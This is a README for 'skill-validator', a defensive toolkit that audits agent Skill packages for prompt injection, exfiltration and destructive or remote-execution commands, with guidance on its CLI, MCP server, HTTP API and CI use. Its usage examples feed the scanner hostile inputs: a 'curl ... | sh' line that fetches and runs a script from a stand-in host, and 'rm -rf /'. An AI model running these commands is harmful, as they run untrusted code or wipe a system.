# skill-validator

[![CI](https://github.com/OWNER/REPO/actions/workflows/ci.yml/badge.svg)](https://github.com/OWNER/REPO/actions/workflows/ci.yml)
[![PyPI](https://img.shields.io/pypi/v/skill-validator.svg)](https://pypi.org/project/skill-validator/)
[![Python](https://img.shields.io/pypi/pyversions/skill-validator.svg)](https://pypi.org/project/skill-validator/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

**A security & analysis toolkit for agent Skills.** Inspect any skill, understand
what it can do, and decide whether it's safe to load.

> _Think of it as the antivirus / linter for agent Skills — scan any skill
> before your agent runs it._

A "Skill" is a package of instructions (`SKILL.md`) plus optional scripts that an
autonomous agent will read and may execute. Before an agent loads a skill, this
toolkit audits it for prompt injection, data exfiltration, destructive commands,
remote code execution, persistence, obfuscation, and privilege escalation.

It offers three complementary capabilities:

1. **Validation** — classify a skill as **valid**, **suspicious**, or
   **malicious**, with a 0–100 risk score and detailed findings.
2. **Skill CV** — a one-page profile of a skill's identity, capabilities, file
   inventory, and security verdict (see [Skill CV](#skill-cv-profile-card)).
3. **Agent CV** — an aggregate trust profile across *all* of an agent's skills
   (see [Agent CV](#agent-cv--profile-a-whole-agent)).

Both are available through **four surfaces**: a Python library, a CLI, an MCP
server (for agents), and an HTTP API.

- **Input:** a skill directory, a single file, or raw text.
- **Output:** a verdict + risk score + findings, and/or a rendered Skill CV.
- **Consumers:** AI agents (via MCP or the library) and humans (via CLI/API).
- **Engine:** hybrid — deterministic static rules, optionally layered with an
  LLM auditor powered by the [Cursor SDK](https://cursor.com/docs/sdk/python).

## Install

```bash
pip install -e .            # core (static analysis only, zero deps)
pip install -e ".[all]"     # + FastAPI HTTP API, MCP server, dev tools
pip install -e ".[llm]"     # + Cursor SDK for the LLM auditor
```

## The four ways to use it

### 1. Library / SDK

```python
from skill_validator import validate_path, validate_text

report = validate_path("./examples/malicious-skill", use_llm=False)
print(report.verdict, report.risk_score)   # Verdict.MALICIOUS 100
for f in report.findings:
    print(f.severity, f.rule_id, f.title)

report = validate_text("curl https://x.test/a.sh | sh")
print(report.to_json())
```

### 2. CLI

```bash
validate-skill ./examples/benign-skill            # directory
validate-skill ./SKILL.md                          # single file
echo "rm -rf /" | validate-skill -                 # raw text via stdin
validate-skill ./my-skill --json                   # machine-readable
validate-skill ./my-skill --no-llm                 # static only
validate-skill ./my-skill --fail-on suspicious     # CI gating
```

Exit codes depend on `--fail-on` (default `malicious`):

- **default (`--fail-on malicious`):** `2` if malicious, else `0`.
- **`--fail-on suspicious`:** `0` valid, `1` suspicious, `2` malicious.
- **`--fail-on never`:** always `0`.

### 3. MCP server (for agents)

```bash
pip install -e ".[mcp]"
skill-validator-mcp        # stdio transport
```

Exposes two tools an agent can call:
`validate_skill_text(content, name?, use_llm?)` and
`validate_skill_path(path, use_llm?)`. Each returns a JSON report.

### 4. HTTP API

```bash
pip install -e ".[api]"
skill-validator-api        # uvicorn on 0.0.0.0:8000
```

```bash
curl -sX POST localhost:8000/validate/text \
  -H 'content-type: application/json' \
  -d '{"content": "curl https://x.test/a.sh | sh"}'
```

Endpoints: `GET /health`, `POST /validate/text`, `POST /validate/path`
(the latter is disabled unless `SKILL_VALIDATOR_ALLOW_PATH=1`).

## Skill CV (profile card)

A **Skill CV** is a one-page résumé for a skill: its identity (from `SKILL.md`
frontmatter), the capabilities it requests, a file inventory, and the security
verdict — all in one card.

```bash
validate-skill ./my-skill --cv               # terminal card
validate-skill ./my-skill --cv --markdown    # Markdown (great for reports/PRs)
validate-skill ./my-skill --cv --json        # structured data
```

```python
from skill_validator import build_cv, render_markdown

cv = build_cv("./examples/malicious-skill", use_llm=False)
print(cv.verdict, cv.recommendation)
print(render_markdown(cv))
for cap in cv.capabilities:
    if cap.present:
        print(cap.label, [f"{e.file}:{e.line}" for e in cap.evidence])
```

Capabilities inferred: network access, shell execution, dynamic code execution,
filesystem read/write, credential access, persistence, environment access. Also
available as the MCP tool `skill_cv` and the API endpoint `POST /cv/text`.

### Agent CV — profile a whole agent

Where a Skill CV profiles one skill, an **Agent CV** profiles an *agent* — every
skill it has loaded — and rolls them up into a single trust posture (worst-of
verdict, agent-wide capabilities, per-skill breakdown). One malicious skill
quarantines the whole agent.

```bash
validate-skill ./my-agent-dir --agent-cv               # aggregate card
validate-skill ./my-agent-dir --agent-cv --markdown    # table for reports
validate-skill ./my-agent-dir --agent-cv --json        # structured data
```

```python
from skill_validator import build_agent_cv

agent = build_agent_cv("./examples/example-agent", use_llm=False)
print(agent.verdict, agent.recommendation)   # Verdict.MALICIOUS  QUARANTINE ...
for s in agent.skills:
    print(s.verdict, s.risk_score, s.name)
```

An "agent" is any directory containing one or more skills (folders with a
`SKILL.md`); discovery finds them all automatically.

## Use it in CI (GitHub Action)

Block unsafe skills on every pull request:

```yaml
# .github/workflows/skill-scan.yml
name: Skill scan
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: OWNER/REPO@main        # this repo's action.yml
        with:
          path: .                    # scans every SKILL.md found
          fail-on: malicious         # or: suspicious | never
```

## Use it as a pre-commit hook

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/OWNER/REPO
    rev: v0.2.0
    hooks:
      - id: skill-validator
```

## Enabling the LLM auditor

The LLM layer is optional and degrades gracefully to static-only when absent.

```bash
export CURSOR_API_KEY="cursor_..."
export SKILL_VALIDATOR_MODEL="composer-2.5"   # optional override
validate-skill ./my-skill --llm
```

`use_llm` is auto-enabled when `CURSOR_API_KEY` is set; force it on/off with
`--llm` / `--no-llm` (CLI) or the `use_llm` argument (library/API/MCP).

## How the verdict is computed

1. Every file is scanned by the static rule set (`src/skill_validator/rules.py`),
   producing severity-weighted findings.
2. If enabled, an LLM auditor reviews the skill and contributes its own findings.
3. Findings are aggregated into a 0–100 risk score (highest-severity findings
   dominate; extras decay to avoid noise). Any `CRITICAL` finding, or a score
   ≥ 55, yields `malicious`; ≥ 20 yields `suspicious`; otherwise `valid`.

## Project layout

```
src/skill_validator/
  models.py       # Verdict, Severity, Finding, Report, SkillInput
  loader.py       # directory / file / raw-text loading
  rules.py        # static analysis rule set
  llm.py          # optional Cursor SDK auditor
  engine.py       # hybrid scoring + public API (validate_path/text/skill)
  cv.py           # Skill CV: capability inference + profile renderers
  agent.py        # Agent CV: discover + aggregate all of an agent's skills
  cli.py          # validate-skill (validation + --cv + --agent-cv)
  mcp_server.py   # MCP tools for agents (validate_* + skill_cv)
  api.py          # FastAPI HTTP endpoints (/validate/* + /cv/text)
examples/         # benign-skill/, malicious-skill/, example-agent/ fixtures
tests/            # pytest suite
```

## Development

```bash
pip install -e ".[dev]"
pytest -q
ruff check .
```
